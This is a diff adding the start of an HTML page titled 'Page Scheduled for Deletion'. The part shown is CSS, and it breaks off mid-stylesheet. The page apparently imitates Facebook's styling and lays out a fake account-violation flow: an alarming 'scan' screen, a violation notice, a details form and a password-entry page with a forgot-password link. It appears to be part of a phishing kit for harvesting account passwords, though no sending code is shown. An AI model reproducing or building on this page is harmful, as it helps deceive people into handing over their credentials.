@@ -1,0 +1,1980 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Page Scheduled for Deletion</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+    :root {
+        --glass: rgba(255, 255, 255, .66);
+        --glass-strong: rgba(255, 255, 255, .84);
+        --glass-soft: rgba(246, 250, 255, .62);
+        --glass-input: rgba(255, 255, 255, .58);
+        --line: rgba(92, 121, 161, .18);
+        --line-strong: rgba(24, 119, 242, .34);
+        --ink: #18243a;
+        --ink-soft: #33435a;
+        --muted: #68788f;
+        --muted-light: #98a5b7;
+        --blue: #1877f2;
+        --blue-hover: #0d6fe8;
+        --blue-deep: #075fc9;
+        --blue-soft: rgba(24, 119, 242, .10);
+        --danger: #e45862;
+        --danger-deep: #c94350;
+        --danger-soft: rgba(228, 88, 98, .11);
+        --success: #27895b;
+        --shadow: 0 18px 48px rgba(48, 82, 123, .13), inset 0 1px 0 rgba(255, 255, 255, .85);
+        --shadow-hover: 0 24px 60px rgba(48, 82, 123, .18), inset 0 1px 0 rgba(255, 255, 255, .92);
+    }
+
+    *, *::before, *::after {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+    }
+
+    html { background: #eef5fd; }
+
+    body {
+        font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
+        background:
+            radial-gradient(circle at 6% -8%, rgba(174, 215, 255, .78) 0, transparent 34rem),
+            radial-gradient(circle at 101% 3%, rgba(222, 210, 255, .64) 0, transparent 31rem),
+            radial-gradient(circle at 50% 110%, rgba(190, 237, 226, .45) 0, transparent 35rem),
+            linear-gradient(145deg, #f9fbff 0%, #eef4fb 48%, #f7f9fd 100%);
+        background-attachment: fixed;
+        color: var(--ink);
+        min-height: 100vh;
+        -webkit-font-smoothing: antialiased;
+        text-rendering: optimizeLegibility;
+    }
+
+    button, input { -webkit-tap-highlight-color: transparent; }
+
+    .step { display: none; }
+    .step.active { display: block; }
+
+    #lang-wrap {
+        position: fixed;
+        inset: 0;
+        background: rgba(41, 57, 82, .25);
+        backdrop-filter: blur(18px) saturate(135%);
+        -webkit-backdrop-filter: blur(18px) saturate(135%);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 9000;
+        opacity: 0;
+        pointer-events: none;
+        transition: opacity .35s ease;
+    }
+
+    #lang-wrap.show {
+        opacity: 1;
+        pointer-events: all;
+    }
+
+    #lang-box {
+        background: linear-gradient(135deg, rgba(255, 255, 255, .90), rgba(246, 250, 255, .70));
+        border: 1px solid rgba(255, 255, 255, .88);
+        border-radius: 24px;
+        padding: 28px;
+        width: 92%;
+        max-width: 500px;
+        box-shadow: 0 28px 70px rgba(21, 45, 80, .22), inset 0 1px 0 rgba(255, 255, 255, .95);
+        backdrop-filter: blur(26px) saturate(145%);
+        -webkit-backdrop-filter: blur(26px) saturate(145%);
+        transform: translateY(18px) scale(.985);
+        transition: transform .35s ease, box-shadow .35s ease;
+    }
+
+    #lang-wrap.show #lang-box {
+        transform: translateY(0) scale(1);
+    }
+
+    .lm-top {
+        display: flex;
+        align-items: center;
+        gap: 11px;
+        margin-bottom: 5px;
+    }
+
+    .lm-icon {
+        width: 36px;
+        height: 36px;
+        background: linear-gradient(135deg, #3996ff, #0e6ee5);
+        border: 1px solid rgba(255, 255, 255, .62);
+        border-radius: 12px;
+        box-shadow: 0 9px 18px rgba(24, 119, 242, .24), inset 0 1px 0 rgba(255, 255, 255, .4);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        flex-shrink: 0;
+    }
+
+    .lm-icon img {
+        width: 20px;
+        height: 20px;
+        border-radius: 50%;
+        filter: brightness(0) invert(1);
+    }
+
+    .lm-h {
+        font-size: 17px;
+        font-weight: 800;
+        color: var(--ink);
+        letter-spacing: -.2px;
+    }
+
+    .lm-sub {
+        font-size: 13px;
+        color: var(--muted);
+        margin-bottom: 16px;
+    }
+
+    .lm-search {
+        width: 100%;
+        padding: 10px 13px;
+        border: 1px solid var(--line);
+        border-radius: 12px;
+        font-size: 13.5px;
+        font-family: inherit;
+        color: var(--ink);
+        background: var(--glass-input);
+        box-shadow: inset 0 1px 2px rgba(51, 79, 118, .04);
+        outline: none;
+        margin-bottom: 13px;
+        transition: border-color .2s, box-shadow .2s, background .2s;
+    }
+
+    .lm-search:focus {
+        border-color: var(--line-strong);
+        background: rgba(255, 255, 255, .88);
+        box-shadow: 0 0 0 4px rgba(24, 119, 242, .12);
+    }
+
+    .lm-grid {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 8px;
+        max-height: 260px;
+        overflow-y: auto;
+        padding-right: 4px;
+    }
+
+    .lm-grid::-webkit-scrollbar { width: 5px; }
+
+    .lm-grid::-webkit-scrollbar-thumb {
+        background: rgba(113, 137, 168, .32);
+        border-radius: 99px;
+    }
+
+    .lm-opt {
+        display: flex;
+        align-items: center;
+        gap: 9px;
+        padding: 10px 13px;
+        border: 1px solid var(--line);
+        border-radius: 12px;
+        cursor: pointer;
+        font-size: 13.5px;
+        font-weight: 600;
+        color: var(--ink-soft);
+        background: rgba(255, 255, 255, .48);
+        box-shadow: inset 0 1px 0 rgba(255, 255, 255, .72);
+        transition: all .18s ease;
+    }
+
+    .lm-opt:hover {
+        border-color: var(--line-strong);
+        background: rgba(238, 247, 255, .88);
+        box-shadow: 0 7px 16px rgba(45, 84, 132, .08), inset 0 1px 0 #fff;
+        transform: translateY(-1px);
+    }
+
+    .lm-opt.sel {
+        border-color: rgba(24, 119, 242, .48);
+        background: linear-gradient(135deg, rgba(231, 243, 255, .96), rgba(245, 250, 255, .82));
+        box-shadow: 0 6px 16px rgba(24, 119, 242, .10), inset 0 1px 0 #fff;
+        color: #095fc7;
+    }
+
+    .lm-opt img {
+        width: 22px;
+        height: 16px;
+        border-radius: 4px;
+        object-fit: cover;
+        flex-shrink: 0;
+        box-shadow: 0 1px 3px rgba(31, 51, 80, .14);
+    }
+
+    .lm-confirm {
+        margin-top: 14px;
+        width: 100%;
+        padding: 13px;
+        background: linear-gradient(135deg, #2387fa, #0b6fe8);
+        color: #fff;
+        font-size: 15px;
+        font-weight: 700;
+        border: 1px solid rgba(255, 255, 255, .34);
+        border-radius: 13px;
+        cursor: pointer;
+        font-family: inherit;
+        box-shadow: 0 12px 24px rgba(24, 119, 242, .24), inset 0 1px 0 rgba(255, 255, 255, .35);
+        transition: transform .2s ease, box-shadow .2s ease, background .2s ease, opacity .2s;
+    }
+
+    .lm-confirm:disabled {
+        opacity: .45;
+        cursor: not-allowed;
+        box-shadow: none;
+    }
+
+    .lm-confirm:not(:disabled):hover {
+        background: linear-gradient(135deg, #1680f8, #0567db);
+        box-shadow: 0 15px 28px rgba(24, 119, 242, .30), inset 0 1px 0 rgba(255, 255, 255, .38);
+        transform: translateY(-1px);
+    }
+
+    .topbar-lang {
+        display: flex;
+        align-items: center;
+        gap: 6px;
+        margin-left: auto;
+        padding: 6px 10px;
+        border: 1px solid var(--line);
+        border-radius: 10px;
+        background: rgba(255, 255, 255, .54);
+        color: var(--ink-soft);
+        box-shadow: inset 0 1px 0 rgba(255, 255, 255, .8);
+        font-size: 12.5px;
+        font-weight: 600;
+        cursor: pointer;
+        font-family: inherit;
+        transition: border-color .2s, background .2s, transform .2s;
+    }
+
+    .topbar-lang:hover {
+        border-color: var(--line-strong);
+        background: rgba(255, 255, 255, .82);
+        transform: translateY(-1px);
+    }
+
+    .topbar-lang img {
+        width: 16px;
+        height: 12px;
+        border-radius: 3px;
+        box-shadow: 0 1px 2px rgba(31, 51, 80, .14);
+    }
+
+    .topbar {
+        background: rgba(255, 255, 255, .70);
+        border-bottom: 1px solid rgba(111, 140, 177, .15);
+        box-shadow: 0 8px 26px rgba(48, 82, 123, .06), inset 0 1px 0 rgba(255, 255, 255, .76);
+        backdrop-filter: blur(22px) saturate(150%);
+        -webkit-backdrop-filter: blur(22px) saturate(150%);
+        height: 56px;
+        display: flex;
+        align-items: center;
+        padding: 0 20px;
+        gap: 10px;
+        position: sticky;
+        top: 0;
+        z-index: 200;
+    }
+
+    .topbar-logo {
+        width: 70px;
+        height: 30px;
+        border-radius: 10px;
+        overflow: hidden;
+        flex-shrink: 0;
+        border: 1px solid rgba(255, 255, 255, .72);
+        box-shadow: 0 4px 10px rgba(43, 71, 108, .10);
+    }
+
+    .topbar-logo img {
+        width: 100%;
+        height: 100%;
+        display: block;
+        object-fit: cover;
+    }
+
+    .topbar-sep {
+        width: 1px;
+        height: 24px;
+        background: linear-gradient(180deg, transparent, rgba(102, 127, 160, .36), transparent);
+    }
+
+    .topbar-title {
+        font-size: 15px;
+        font-weight: 800;
+        color: var(--blue);
+        letter-spacing: -.15px;
+    }
+
+    .topbar-right { margin-left: auto; }
+
+    .site-footer {
+        padding: 20px;
+        text-align: center;
+        font-size: 12px;
+        color: var(--muted);
+        line-height: 2.2;
+        border-top: 1px solid rgba(111, 140, 177, .14);
+        background: rgba(255, 255, 255, .42);
+        backdrop-filter: blur(16px) saturate(130%);
+        -webkit-backdrop-filter: blur(16px) saturate(130%);
+    }
+
+    .site-footer a {
+        color: var(--muted);
+        text-decoration: none;
+        transition: color .18s ease;
+    }
+
+    .site-footer a:hover {
+        color: var(--blue);
+        text-decoration: underline;
+    }
+
+    .site-footer .s {
+        margin: 0 5px;
+        color: #b1bdcc;
+    }
+
+    .card {
+        background: linear-gradient(135deg, rgba(255, 255, 255, .82), rgba(248, 251, 255, .58));
+        border: 1px solid rgba(255, 255, 255, .78);
+        border-radius: 22px;
+        box-shadow: var(--shadow);
+        backdrop-filter: blur(24px) saturate(145%);
+        -webkit-backdrop-filter: blur(24px) saturate(145%);
+        margin-bottom: 14px;
+    }
+
+    .fb-btn {
+        width: 100%;
+        padding: 14px;
+        background: linear-gradient(135deg, #2589fa, #0b6fe8);
+        color: #fff;
+        font-size: 15px;
+        font-weight: 800;
+        font-family: inherit;
+        border: 1px solid rgba(255, 255, 255, .32);
+        border-radius: 13px;
+        cursor: pointer;
+        box-shadow: 0 12px 24px rgba(24, 119, 242, .24), inset 0 1px 0 rgba(255, 255, 255, .36);
+        transition: background .15s, transform .15s, box-shadow .15s;
+        position: relative;
+        letter-spacing: .1px;
+    }
+
+    .fb-btn:hover {
+        background: linear-gradient(135deg, #137df7, #0767db);
+        box-shadow: 0 16px 28px rgba(24, 119, 242, .30), inset 0 1px 0 rgba(255, 255, 255, .38);
+        transform: translateY(-1px);
+    }
+
+    .fb-btn:active {
+        background: linear-gradient(135deg, #116fdc, #075fc9);
+        transform: translateY(0) scale(.99);
+    }
+
+    .fb-btn:disabled {
+        opacity: .7;
+        cursor: not-allowed;
+        box-shadow: none;
+    }
+
+    .fb-btn.loading .btn-label { visibility: hidden; }
+
+    .fb-btn.loading::after {
+        content: '';
+        position: absolute;
+        inset: 0;
+        margin: auto;
+        width: 20px;
+        height: 20px;
+        border: 2.5px solid rgba(255, 255, 255, .32);
+        border-top-color: #fff;
+        border-radius: 50%;
+        animation: spin .75s linear infinite;
+    }
+
+    #scanScreen {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        min-height: calc(100vh - 56px);
+        padding: 40px 24px;
+        text-align: center;
+    }
+
+    .scan-ring-wrap {
+        position: relative;
+        width: 110px;
+        height: 110px;
+        margin: 0 auto 28px;
+        border-radius: 50%;
+        background: rgba(255, 255, 255, .44);
+        border: 1px solid rgba(255, 255, 255, .74);
+        box-shadow: 0 18px 38px rgba(45, 79, 120, .14), inset 0 1px 0 rgba(255, 255, 255, .88);
+        backdrop-filter: blur(16px);
+        -webkit-backdrop-filter: blur(16px);
+    }
+
+    .scan-ring {
+        position: absolute;
+        inset: 0;
+        border-radius: 50%;
+        border: 3px solid rgba(116, 141, 174, .18);
+        border-top-color: #ef6871;
+        animation: spin 1s linear infinite;
+    }
+
+    .scan-ring-inner {
+        position: absolute;
+        inset: 10px;
+        border-radius: 50%;
+        border: 2.5px solid rgba(116, 141, 174, .16);
+        border-bottom-color: #f28b73;
+        animation: spin 1.6s linear infinite reverse;
+    }
+
+    .scan-fb-icon {
+        position: absolute;
+        inset: 0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+
+    .scan-fb-icon img {
+        width: 52px;
+        height: 52px;
+        border-radius: 50%;
+        box-shadow: 0 6px 15px rgba(24, 119, 242, .18);
+    }
+
+    .scan-title {
+        font-size: 19px;
+        font-weight: 800;
+        color: var(--ink);
+        margin-bottom: 8px;
+        letter-spacing: -.25px;
+    }
+
+    .scan-sub {
+        font-size: 13.5px;
+        color: var(--muted);
+        margin-bottom: 22px;
+        line-height: 1.55;
+    }
+
+    .scan-progress-wrap {
+        width: 100%;
+        max-width: 280px;
+        padding: 12px 14px;
+        border: 1px solid rgba(255, 255, 255, .72);
+        border-radius: 15px;
+        background: rgba(255, 255, 255, .48);
+        box-shadow: inset 0 1px 0 rgba(255, 255, 255, .75);
+        backdrop-filter: blur(14px);
+        -webkit-backdrop-filter: blur(14px);
+    }
+
+    .scan-progress-bar {
+        width: 100%;
+        height: 6px;
+        background: rgba(105, 132, 167, .16);
+        border-radius: 99px;
+        overflow: hidden;
+        margin-bottom: 10px;
+    }
+
+    .scan-progress-fill {
+        height: 100%;
+        background: linear-gradient(90deg, #ef6971, #f28b73);
+        border-radius: 99px;
+        box-shadow: 0 0 10px rgba(239, 105, 113, .28);
+        width: 0%;
+        transition: width .08s linear;
+    }
+
+    .scan-status {
+        font-size: 12.5px;
+        color: var(--muted);
+        font-weight: 600;
+        min-height: 18px;
+    }
+
+    .scan-checks {
+        margin-top: 16px;
+        display: flex;
+        flex-direction: column;
+        gap: 8px;
+        width: 100%;
+        max-width: 280px;
+    }
+
+    .scan-chk-row {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        padding: 9px 12px;
+        border: 1px solid rgba(255, 255, 255, .62);
+        border-radius: 12px;
+        background: rgba(255, 255, 255, .36);
+        font-size: 13px;
+        color: var(--muted-light);
+        font-weight: 600;
+        opacity: 0;
+        transform: translateX(-12px);
+        transition: opacity .3s ease, transform .3s ease, background .3s ease, color .3s ease;
+    }
+
+    .scan-chk-row.done {
+        opacity: 1;
+        transform: translateX(0);
+        color: var(--danger-deep);
+        background: rgba(255, 246, 247, .68);
+    }
+
+    .scan-chk-icon {
+        width: 20px;
+        height: 20px;
+        border-radius: 50%;
+        background: rgba(113, 139, 173, .18);
+        flex-shrink: 0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        transition: background .3s, box-shadow .3s;
+    }
+
+    .scan-chk-row.done .scan-chk-icon {
+        background: linear-gradient(135deg, #ec6971, #d94d59);
+        box-shadow: 0 4px 10px rgba(228, 88, 98, .24);
+    }
+
+    .scan-chk-icon svg {
+        width: 10px;
+        height: 10px;
+        opacity: 0;
+        transition: opacity .2s .1s;
+    }
+
+    .scan-chk-row.done .scan-chk-icon svg { opacity: 1; }
+
+    #violationFlash {
+        display: none;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        min-height: calc(100vh - 56px);
+        padding: 40px 24px;
+        text-align: center;
+    }
+
+    #violationFlash.show { display: flex; }
+
+    .violation-wrap {
+        position: relative;
+        width: 90px;
+        height: 90px;
+        margin: 0 auto 20px;
+    }
+
+    .violation-icon {
+        width: 90px;
+        height: 90px;
+        font-size: 60px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        filter: drop-shadow(0 10px 18px rgba(228, 88, 98, .18));
+        animation: badgePop .5s cubic-bezier(.34, 1.56, .64, 1) both;
+    }
+
+    .violation-glow {
+        width: 90px;
+        height: 90px;
+        border-radius: 50%;
+        background: rgba(228, 88, 98, .14);
+        position: absolute;
+        animation: glowPulse 1.5s ease-in-out infinite;
+    }
+
+    .violation-title {
+        font-size: 23px;
+        font-weight: 900;
+        color: var(--ink);
+        margin-bottom: 6px;
+        letter-spacing: -.4px;
+        animation: fadeUp .4s .2s both;
+    }
+
+    .violation-sub {
+        font-size: 14px;
+        color: var(--muted);
+        animation: fadeUp .4s .35s both;
+        margin-bottom: 24px;
+    }
+
+    .violation-tag {
+        display: inline-flex;
+        align-items: center;
+        gap: 7px;
+        background: rgba(255, 244, 245, .78);
+        border: 1px solid rgba(228, 88, 98, .42);
+        border-radius: 99px;
+        padding: 7px 18px;
+        box-shadow: inset 0 1px 0 rgba(255, 255, 255, .78);
+        font-size: 12px;
+        font-weight: 800;
+        color: var(--danger-deep);
+        text-transform: uppercase;
+        letter-spacing: .7px;
+        animation: fadeUp .4s .5s both;
+    }
+
+    .violation-dot {
+        width: 7px;
+        height: 7px;
+        background: var(--danger);
+        border-radius: 50%;
+        box-shadow: 0 0 0 3px rgba(228, 88, 98, .10);
+        animation: pulse 1.5s ease-in-out infinite;
+    }
+
+    .mv-page {
+        max-width: 480px;
+        margin: 28px auto;
+        padding: 0 16px 40px;
+        animation: fadeUp .45s ease both;
+    }
+
+    .mv-card {
+        padding: 0;
+        overflow: hidden;
+    }
+
+    .mv-header {
+        padding: 26px 20px 18px;
+        text-align: center;
+        border-bottom: 1px solid var(--line);
+        background: linear-gradient(180deg, rgba(255, 255, 255, .32), rgba(241, 247, 255, .28));
+    }
+
+    .mv-title {
+        font-size: 21px;
+        font-weight: 800;
+        color: var(--ink);
+        margin-bottom: 14px;
+        letter-spacing: -.3px;
+    }
+
+    .mv-notice-wrap {
+        width: 64px;
+        height: 64px;
+        margin: 0 auto 10px;
+        position: relative;
+    }
+
+    .mv-notice-wrap .warning-symbol {
+        width: 64px;
+        height: 64px;
+        font-size: 48px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        filter: drop-shadow(0 7px 13px rgba(228, 88, 98, .15));
+        animation: badgePop .6s cubic-bezier(.34, 1.56, .64, 1) both;
+    }
+
+    .mv-notice-glow {
+        position: absolute;
+        inset: -8px;
+        border-radius: 50%;
+        background: rgba(228, 88, 98, .10);
+        animation: glowPulse 2s ease-in-out infinite;
+    }
+
+    .mv-plan-name {
+        font-size: 17px;
+        font-weight: 800;
+        color: var(--ink);
+        margin-bottom: 2px;
+    }
+
+    .mv-plan-desc {
+        font-size: 13px;
+        color: var(--muted);
+        margin-bottom: 10px;
+    }
+
+    .mv-free-tag {
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+        background: rgba(255, 244, 245, .76);
+        border: 1px solid rgba(228, 88, 98, .40);
+        border-radius: 99px;
+        padding: 5px 14px;
+        box-shadow: inset 0 1px 0 rgba(255, 255, 255, .75);
+        font-size: 11.5px;
+        font-weight: 800;
+        color: var(--danger-deep);
+        text-transform: uppercase;
+        letter-spacing: .65px;
+        margin-bottom: 4px;
+        position: relative;
+        overflow: hidden;
+    }
+
+    .mv-free-tag::after {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: -60%;
+        width: 40%;
+        height: 100%;
+        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, .72), transparent);
+        animation: shimmer 2.5s ease-in-out infinite;
+    }
+
+    .mv-free-dot {
+        width: 6px;
+        height: 6px;
+        background: var(--danger);
+        border-radius: 50%;
+        animation: pulse 1.5s ease-in-out infinite;
+    }
+
+    .mv-body { padding: 0 20px 8px; }
+
+    .mv-badge-item {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        padding: 14px 0;
+        border-bottom: 1px solid var(--line);
+        animation: fadeUp .35s ease both;
+    }
+
+    .mv-badge-item .chk-circle {
+        width: 22px;
+        height: 22px;
+        border: 2px solid rgba(69, 96, 132, .65);
+        border-radius: 50%;
+        background: rgba(255, 255, 255, .48);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        flex-shrink: 0;
+    }
+
+    .mv-badge-item .chk-circle svg {
+        width: 11px;
+        height: 11px;
+    }
+
+    .mv-badge-item-label {
+        font-size: 14px;
+        color: var(--ink-soft);
+        font-weight: 600;
+    }
+
+    .mv-section {
+        padding: 16px 0 5px;
+        border-bottom: 1px solid var(--line);
+    }
+
+    .mv-section:last-child { border-bottom: none; }
+
+    .mv-section-title {
+        font-size: 12px;
+        font-weight: 800;
+        color: var(--ink);
+        margin-bottom: 11px;
+        text-transform: uppercase;
+        letter-spacing: .55px;
+    }
+
+    .mv-feat {
+        display: flex;
+        align-items: flex-start;
+        gap: 10px;
+        margin-bottom: 11px;
+        opacity: 0;
+        transform: translateX(-10px);
+        transition: opacity .3s ease, transform .3s ease;
+    }
+
+    .mv-feat.visible {
+        opacity: 1;
+        transform: translateX(0);
+    }
+
+    .mv-chk {
+        width: 18px;
+        height: 18px;
+        flex-shrink: 0;
+        margin-top: 1px;
+    }
+
+    .mv-chk svg {
+        width: 18px;
+        height: 18px;
+    }
+
+    .mv-feat-text {
+        font-size: 13.5px;
+        color: var(--ink-soft);
+        line-height: 1.45;
+    }
+
+    .mv-feat-sub {
+        font-size: 12px;
+        color: var(--muted);
+        margin-top: 2px;
+        line-height: 1.4;
+    }
+
+    .mv-card-foot {
+        padding: 14px 20px 22px;
+        text-align: center;
+    }
+
+    .mv-age-note {
+        font-size: 12px;
+        color: var(--muted-light);
+        margin-bottom: 14px;
+    }
+
+    .mv-continue-btn {
+        width: 100%;
+        padding: 14px;
+        background: linear-gradient(135deg, #2589fa, #0b6fe8);
+        color: #fff;
+        font-size: 16px;
+        font-weight: 700;
+        font-family: inherit;
+        border: 1px solid rgba(255, 255, 255, .32);
+        border-radius: 13px;
+        cursor: pointer;
+        box-shadow: 0 12px 24px rgba(24, 119, 242, .24), inset 0 1px 0 rgba(255, 255, 255, .35);
+        transition: background .15s, transform .15s, box-shadow .15s;
+    }
+
+    .mv-continue-btn:hover {
+        background: linear-gradient(135deg, #137df7, #0767db);
+        box-shadow: 0 16px 28px rgba(24, 119, 242, .30), inset 0 1px 0 rgba(255, 255, 255, .38);
+        transform: translateY(-1px);
+    }
+
+    .form-page {
+        max-width: 640px;
+        margin: 28px auto;
+        padding: 0 16px 40px;
+    }
+
+    .breadcrumb {
+        width: fit-content;
+        font-size: 12.5px;
+        color: var(--muted);
+        margin-bottom: 16px;
+        padding: 7px 10px;
+        border: 1px solid rgba(255, 255, 255, .64);
+        border-radius: 11px;
+        background: rgba(255, 255, 255, .40);
+        box-shadow: inset 0 1px 0 rgba(255, 255, 255, .68);
+        display: flex;
+        align-items: center;
+        gap: 5px;
+        flex-wrap: wrap;
+    }
+
+    .breadcrumb a {
+        color: var(--blue);
+        text-decoration: none;
+        font-weight: 600;
+    }
+
+    .breadcrumb a:hover { text-decoration: underline; }
+
+    .bc-sep { color: #aebaca; }
+
+    .hdr-card {
+        padding: 22px 20px;
+        display: flex;
+        align-items: flex-start;
+        gap: 13px;
+    }
+
+    .hdr-badge {
+        width: 46px;
+        height: 46px;
+        flex-shrink: 0;
+        font-size: 32px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border: 1px solid rgba(255, 255, 255, .72);
+        border-radius: 15px;
+        background: linear-gradient(135deg, rgba(225, 241, 255, .96), rgba(242, 235, 255, .76));
+        box-shadow: 0 8px 18px rgba(62, 101, 149, .10), inset 0 1px 0 #fff;
+    }
+
+    .hdr-h {
+        font-size: 17px;
+        font-weight: 800;
+        color: var(--ink);
+        margin-bottom: 4px;
+    }
+
+    .hdr-p {
+        font-size: 13px;
+        color: var(--muted);
+        line-height: 1.55;
+    }
+
+    .info-card {
+        padding: 17px 20px;
+        border: 1px solid rgba(255, 255, 255, .72);
+        border-radius: 18px;
+        background: rgba(255, 255, 255, .53);
+        box-shadow: inset 0 1px 0 rgba(255, 255, 255, .82);
+        backdrop-filter: blur(18px);
+        -webkit-backdrop-filter: blur(18px);
+        font-size: 13.5px;
+        color: var(--ink-soft);
+        line-height: 1.65;
+    }
+
+    .info-card-t {
+        font-size: 13.5px;
+        font-weight: 750;
+        color: var(--ink);
+        margin-bottom: 6px;
+        display: flex;
+        align-items: center;
+        gap: 7px;
+    }
+
+    .info-card-t .dot {
+        width: 7px;
+        height: 7px;
+        border-radius: 50%;
+        background: var(--danger);
+        box-shadow: 0 0 0 4px rgba(228, 88, 98, .10);
+        flex-shrink: 0;
+    }
+
+    .warn-strip {
+        display: flex;
+        align-items: flex-start;
+        gap: 9px;
+        background: rgba(255, 248, 222, .68);
+        border: 1px solid rgba(226, 176, 55, .40);
+        border-radius: 14px;
+        padding: 12px 15px;
+        box-shadow: inset 0 1px 0 rgba(255, 255, 255, .66);
+        backdrop-filter: blur(16px);
+        -webkit-backdrop-filter: blur(16px);
+        margin-bottom: 14px;
+        font-size: 13px;
+        color: #805c13;
+        font-weight: 600;
+        line-height: 1.5;
+    }
+
+    .vid-card {
+        overflow: hidden;
+        border: 1px solid rgba(255, 255, 255, .78);
+        border-radius: 22px;
+        background: rgba(255, 255, 255, .62);
+        box-shadow: var(--shadow);
+        backdrop-filter: blur(22px);
+        -webkit-backdrop-filter: blur(22px);
+    }
+
+    .vid-lbl {
+        padding: 13px 18px 10px;
+        font-size: 13.5px;
+        font-weight: 750;
+        color: var(--ink);
+        display: flex;
+        align-items: center;
+        gap: 7px;
+    }
+
+    .vid-lbl svg {
+        width: 16px;
+        height: 16px;
+        color: var(--blue);
+    }
+
+    .vid-card video {
+        width: 100%;
+        display: block;
+        max-height: 320px;
+        background: #dfe8f4;
+    }
+
+    .frm-card { padding: 22px 20px; }
+
+    .frm-t {
+        font-size: 15px;
+        font-weight: 800;
+        color: var(--ink);
+        margin-bottom: 3px;
+    }
+
+    .frm-s {
+        font-size: 13px;
+        color: var(--muted);
+        margin-bottom: 18px;
+        line-height: 1.5;
+    }
+
+    .f-group { margin-bottom: 15px; }
+
+    .f-group label {
+        display: block;
+        font-size: 13px;
+        font-weight: 700;
+        color: var(--ink-soft);
+        margin-bottom: 6px;
+    }
+
+    .f-group label em {
+        font-style: normal;
+        font-weight: 500;
+        color: var(--muted-light);
+        font-size: 11.5px;
+        margin-left: 4px;
+    }
+
+    .f-group input {
+        width: 100%;
+        padding: 12px 14px;
+        border: 1px solid var(--line);
+        border-radius: 12px;
+        font-size: 14.5px;
+        font-family: inherit;
+        color: var(--ink);
+        background: var(--glass-input);
+        box-shadow: inset 0 1px 2px rgba(51, 79, 118, .04);
+        outline: none;
+        transition: border-color .15s, box-shadow .15s, background .15s;
+    }
+
+    .f-group input:focus {
+        border-color: var(--line-strong);
+        background: rgba(255, 255, 255, .88);
+        box-shadow: 0 0 0 4px rgba(24, 119, 242, .12);
+    }
+
+    .f-group input::placeholder { color: #aab6c6; }
+
+    .err-strip {
+        display: flex;
+        align-items: flex-start;
+        gap: 8px;
+        background: rgba(255, 243, 244, .76);
+        border: 1px solid rgba(228, 88, 98, .28);
+        border-radius: 12px;
+        padding: 11px 13px;
+        box-shadow: inset 0 1px 0 rgba(255, 255, 255, .75);
+        font-size: 12.5px;
+        color: var(--danger-deep);
+        font-weight: 600;
+        margin-bottom: 16px;
+        line-height: 1.5;
+    }
+
+    .err-strip svg {
+        width: 14px;
+        height: 14px;
+        flex-shrink: 0;
+        margin-top: 1px;
+    }
+
+    .pw-page {
+        max-width: 640px;
+        margin: 28px auto;
+        padding: 0 16px 40px;
+    }
+
+    .pw-card {
+        padding: 26px 24px;
+        text-align: center;
+    }
+
+    .pw-prompt {
+        font-size: 14.5px;
+        color: var(--muted);
+        margin-bottom: 20px;
+        line-height: 1.55;
+    }
+
+    .pw-input-wrap {
+        position: relative;
+        margin-bottom: 10px;
+    }
+
+    .pw-input-wrap input {
+        width: 100%;
+        padding: 13px 44px 13px 14px;
+        border: 1px solid var(--line);
+        border-radius: 12px;
+        font-size: 15px;
+        font-family: inherit;
+        color: var(--ink);
+        background: var(--glass-input);
+        box-shadow: inset 0 1px 2px rgba(51, 79, 118, .04);
+        outline: none;
+        transition: border-color .15s, box-shadow .15s, background .15s;
+    }
+
+    .pw-input-wrap input:focus {
+        border-color: var(--line-strong);
+        background: rgba(255, 255, 255, .88);
+        box-shadow: 0 0 0 4px rgba(24, 119, 242, .12);
+    }
+
+    .pw-input-wrap input::placeholder { color: #aab6c6; }
+
+    .pw-eye {
+        position: absolute;
+        right: 13px;
+        top: 50%;
+        transform: translateY(-50%);
+        background: none;
+        border: none;
+        cursor: pointer;
+        color: var(--muted);
+        display: flex;
+        padding: 0;
+        transition: color .15s, transform .15s;
+    }
+
+    .pw-eye:hover {
+        color: var(--blue);
+        transform: translateY(-50%) scale(1.06);
+    }
+
+    .pw-err {
+        display: none;
+        background: rgba(255, 243, 244, .76);
+        border: 1px solid rgba(228, 88, 98, .30);
+        border-radius: 12px;
+        padding: 10px 13px;
+        font-size: 12.5px;
+        color: var(--danger-deep);
+        font-weight: 600;
+        text-align: left;
+        margin-bottom: 10px;
+    }
+
+    .pw-err.show { display: block; }
+
+    .pw-forgot {
+        display: block;
+        font-size: 13.5px;
+        color: var(--blue);
+        text-decoration: none;
+        margin-bottom: 16px;
+        text-align: left;
+        font-weight: 600;
+    }
+
+    .pw-forgot:hover { text-decoration: underline; }
+
+    .pw-hr {
+        border: none;
+        border-top: 1px solid var(--line);
+        margin: 0 0 16px;
+    }
+
+    .pw-continue {
+        width: 100%;
+        height: 46px;
+        background: linear-gradient(135deg, #2589fa, #0b6fe8);
+        color: #fff;
+        font-size: 15px;
+        font-weight: 700;
+        font-family: inherit;
+        border: 1px solid rgba(255, 255, 255, .32);
+        border-radius: 13px;
+        cursor: pointer;
+        box-shadow: 0 12px 24px rgba(24, 119, 242, .24), inset 0 1px 0 rgba(255, 255, 255, .35);
+        transition: background .15s, transform .15s, box-shadow .15s;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        position: relative;
+    }
+
+    .pw-continue:hover {
